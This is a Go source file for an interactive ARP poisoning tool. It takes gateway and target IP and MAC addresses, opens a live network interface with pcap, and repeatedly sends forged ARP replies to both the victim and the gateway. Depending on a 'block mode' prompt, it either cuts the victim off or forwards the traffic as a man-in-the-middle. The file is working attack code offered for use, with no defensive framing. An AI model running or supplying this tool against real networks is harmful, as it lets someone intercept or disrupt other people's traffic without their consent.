package arp_poison

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	spoofIP    net.IP
	spoofMAC   net.HardwareAddr
	targetIP   net.IP
	targetMAC  net.HardwareAddr
	attakerMAC net.HardwareAddr
	handle     *pcap.Handle
)

// Start initializes ARP poisoning and starts sending spoofed packets
func pStart(interfaceName string) {
	// User input for spoof and target information
	fmt.Print("Enter the spoof IP (gateway IP): ")
	var spoofIPStr string
	fmt.Scanln(&spoofIPStr)
	if spoofIPStr == "h" || spoofIPStr == "home" {
		fmt.Printf("\nExiting ARP Poisoning...")
		return
	}
	spoofIP = net.ParseIP(spoofIPStr)

	fmt.Print("Enter the target IP: ")
	var targetIPStr string
	fmt.Scanln(&targetIPStr)
	if targetIPStr == "h" || targetIPStr == "home" {
		fmt.Printf("\nExiting ARP Poisoning...")
		return
	}
	targetIP = net.ParseIP(targetIPStr)

	fmt.Print("Enter the spoof MAC (gateway MAC): ")
	var spoofMACStr string
	fmt.Scanln(&spoofMACStr)
	if spoofMACStr == "h" || spoofMACStr == "home" {
		fmt.Printf("\nExiting ARP Poisoning...")
		return
	}
	spoofMAC, _ = net.ParseMAC(spoofMACStr)

	fmt.Print("Enter the attacker MAC : ")
	var attakerMACStr string
	fmt.Scanln(&attakerMACStr)
	if attakerMACStr == "h" || attakerMACStr == "home" {
		fmt.Printf("\nExiting ARP Poisoning...")
		return
	}
	attakerMAC, _ = net.ParseMAC(attakerMACStr)

	fmt.Print("Enter the target MAC: ")
	var targetMACStr string
	fmt.Scanln(&targetMACStr)
	if targetMACStr == "h" || targetMACStr == "home" {
		fmt.Printf("\nExiting ARP Poisoning...")
		return
	}
	targetMAC, _ = net.ParseMAC(targetMACStr)

	// Open network interface
	var err error
	handle, err = pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("Error opening device %s: %v\n", interfaceName, err)
		return
	}
	defer handle.Close()

	// Start spoofing in a goroutine
	if err := sendARPSpoof(interfaceName); err != nil {
		fmt.Printf("Error in sendARPSpoof: %v", err)
		return
	}
}

// sendARPSpoof sends ARP spoofing packets in batches
func sendARPSpoof(interfaceName string) error {
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

	intervalTime := 2 * time.Second
	// Prompt user for interval time
	fmt.Print("Enter the interval time in seconds (press Enter for default 2): ")
	var intervalTimeInput int
	if _, err := fmt.Scanf("%d", &intervalTimeInput); err == nil {
		intervalTime = time.Duration(intervalTimeInput) * time.Second
	}

	fmt.Print("Enter y/n for Block mode or not: ")
	var blokmod string
	fmt.Scanln(&blokmod)
	if blokmod == "h" || blokmod == "home" {
		fmt.Printf("\nExiting ARP Poisoning...")
		return nil
	}

	fmt.Printf("Starting ARP spoofing with interval %v\n", intervalTime)

	ticker := time.NewTicker(intervalTime)
	defer ticker.Stop()

	if blokmod == "n" {
		go StartTrafficForwarding(interfaceName)
	}

	for {
		select {
		case <-stop:
			ticker.Stop()
			return nil
		case <-ticker.C:
			// Send spoofed ARP packets
			packetToTarget := createARPPacket(layers.ARPReply, attakerMAC, spoofIP, targetMAC, targetIP)
			if err := handle.WritePacketData(packetToTarget); err != nil {
				return err
			}

			packetToGateway := createARPPacket(layers.ARPReply, attakerMAC, targetIP, spoofMAC, spoofIP)
			if err := handle.WritePacketData(packetToGateway); err != nil {
				return err
			}
		}
	}
}

// createARPPacket creates an ARP packet with specified parameters
func createARPPacket(op uint16, srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) []byte {
	eth := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         op,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP.To4(),
	}
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{}
	err := gopacket.SerializeLayers(buffer, options, eth, arp)
	if err != nil {
		fmt.Printf("Error creating ARP packet: %v\n", err)
	}
	return buffer.Bytes()
}
